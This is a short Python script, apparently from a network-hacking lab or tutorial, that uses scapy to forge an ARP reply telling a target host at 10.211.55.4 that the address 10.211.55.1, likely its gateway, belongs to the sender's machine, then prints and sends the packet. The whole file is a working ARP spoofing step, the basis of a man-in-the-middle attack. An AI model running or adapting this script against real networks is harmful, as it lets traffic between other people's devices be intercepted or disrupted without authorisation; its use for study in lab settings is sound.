#! /usr/bin/env python
import scapy.all as scapy

# op=1 ==> request
# op=2 ==> response
packet = scapy.ARP(op=2, pdst="10.211.55.4",
                   hwdst="00:1c:42:83:95:fc", psrc="10.211.55.1")
print(packet.show())
print(packet.summary())
scapy.send(packet)
